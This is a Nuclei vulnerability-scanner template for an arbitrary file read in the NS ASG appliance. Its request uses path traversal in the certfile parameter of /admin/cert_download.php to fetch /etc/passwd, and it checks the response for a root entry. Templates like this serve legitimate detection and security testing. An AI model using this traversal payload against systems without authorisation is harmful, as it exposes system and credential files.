id: nsasg-arbitrary-file-read

info:
  name: NS ASG Arbitrary File Read
  author: pikpikcu
  severity: high
  reference: https://zhuanlan.zhihu.com/p/368054963
  tags: nsasg,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd"

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:.*:0:0"

      - type: status
        status:
          - 200
